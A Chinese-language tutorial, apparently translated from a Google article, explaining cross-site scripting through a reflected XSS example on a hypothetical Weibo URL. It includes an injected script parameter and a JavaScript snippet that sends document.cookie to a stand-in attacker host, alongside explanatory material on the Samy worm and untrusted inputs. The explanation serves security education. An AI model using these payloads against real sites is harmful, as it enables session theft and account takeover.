# XSS事项 如何过滤用户输入的标签属性

由于Web浏览器实行一种[同源策略](http://www.mozilla.org/projects/security/components/same-origin.html)，脚本（如`JavaScript`或`VBScript`）想要访问文档中的资源（包括COOKIES和DOM对象以及DOM对象的属性），则必须和文档处于一个相同的域名，包括端口。

翻译自:[原文出处](http://soulteary.com/redirect?r=https://code.google.com/p/doctype-mirror/wiki/ArticleIntroductionToXSS&k=31e40) VER:`Updated Oct 14, 2011 by ivan@ludios.org` 这种策略是必要的，用来防止页面中加载不安全的脚本，例如从`www.张伟是坏蛋.com`访问`weibo.com`的`cookies`。

如果没有这种同源策略的话，假设**微博**的页面被嵌入了来自**张伟是坏蛋**这个网站的恶意脚本，那么**张伟是坏蛋**的恶意脚本就可以修改伪装**微博**页面的DOM结构和内容，扭曲一些事情，或者获取用户在**微博**的cookies，进一步去做一些不怀好意的事情。

### 漏洞举例：

假设`张伟是坏蛋.com`要这么做，那么它要如何做呢？

继续假设微博有这么一个地址，`http://weibo.com/?u=soulteary`，访问这个地址会返回下面的HTML页面内容。

```
...

这里是soulteary的微博，他喜欢收集一些有意思的文章。

...
```

再继续假设写这个功能的程序员当时有事情，疏忽了过滤页面请求中的参数u的内容的内容有效性的处理，比如过滤或者编码。 如果这个时候，有人修改刚刚的URL地址中的参数，再进行请求，那么结果应该是这样：

请求地址 `http://weibo.com/?u=soulteary+%3Cscript%3Eevil_script()%3C/script%3E`

返回结果：

```
...

这里是soulteary<script>evil_script()</script>的微博，他喜欢收集一些有意思的文章。

...
```

那么好了，**张伟是坏蛋**，使用隐形的`iframe`将页面加载在浏览器中，请求上边提到的被修改过的URL。 当受害者从**张伟是坏蛋**那里访问页面，浏览器将加载`iframe`中的内容，出现上面的情况。

这是浏览器将会执行`evil_script`这个脚本中的内容，特别需要注意的一点，脚本的执行位置是`weibo.com`这个网站。

### 漏洞举例：

如果脚本被执行了，那么这个脚本可能会去做什么呢。

#### 窃取Cookies

攻击者可能会这样做：

```js
i = new Image();
i.src="http://www.张伟是坏蛋.org/snarf?cookie=" + escape(document.cookie);
```

这样，攻击者就将受害者的微博cookies发送到了自己的网站，获得了用户在微博上的cookies。 当用户访问`张伟是坏蛋`的时候，攻击者可以将获得到的cookies加入自己的浏览器中，从而伪装成用户登录微博。 如果这个网站不是微博，而是支付宝，或者银行呢，或者是工作邮箱呢？

#### 攻击网络应用

即使攻击者不想获取受害者的cookies以及伪装用户登录网站，攻击者依然可以造成很大的损害。比如攻击者不想让自己的IP记录出现在服务器日志中。 攻击者注入的脚本可以让用户在访问攻击页面的时候，发送包含特定内容的邮件，或着发送银行的流水，或者删除一些隐私。 举个例子，一个叫做“萨米”的蠕虫病毒，在MySpace的社交网站上发布。该蠕虫使用了MySpace的网站上的XSS漏洞，让用户在不自觉的情况下添加一个叫做萨米的朋友关系，并利用MySpace上的朋友关系，继续传播。同样的，微博也有过这样的XSS漏洞，当你发现你莫名其妙关注了谁谁，或许你是访问了攻击页面，受到了未知攻击者的攻击。

#### 篡改WEB应用的UI界面

或者攻击者只是想得到用户的某些网站的帐号密码，这种情况多出现在社会工程学的用例中，比如伪造一些网站或者将一些元素覆盖在真实的页面上，获取用户输入的内容。 比如在一些较小的新闻站点上伪造一些假新闻，或者是在一些购物网站上伪造账户输入框，获取你的帐号信息。

#### 不可信的数据来源

上之前的例子中，攻击者通过改变应用程序的URL的请求参数向目标页面中注入恶意脚本。 请求参数以及表单(Query parameters、Form fields)是一种常见的也是易于被XSS利用的载体。 然而，任何数据可以在攻击者的控制之下插入到HTML文档中引起XSS漏洞。这些数据包含并不仅限于：

*   URL中的请求参数
*   URL的一部分，可能输出例如"某某文档未找到"的错误消息。
*   表单，包括隐藏项目。
*   Cookies
*   HTTP请求头的其他部分，比如referrer地址。
*   早些时候可能由其他用户插入并保存的数据，比如微博上的消息，邮箱中的信件。
*   由第三方提供的数据。比如Google产品搜索中的内容。
*   WEB搜索引擎抓取的内容(Google Search)或本地磁盘的内容(Google Desktop)。

## 扩展阅读

*   [Everything you ever wanted to know about cross-site scripting (XSS) attacks](https://code.google.com/p/doctype-mirror/wiki/ArticleXSS)
*   [Same Origin Policy](http://www.mozilla.org/projects/security/components/same-origin.html)
*   [Cross-Site Scripting Worm Floods MySpace (slashdot.org)](http://it.slashdot.org/it/05/10/14/126233.shtml)

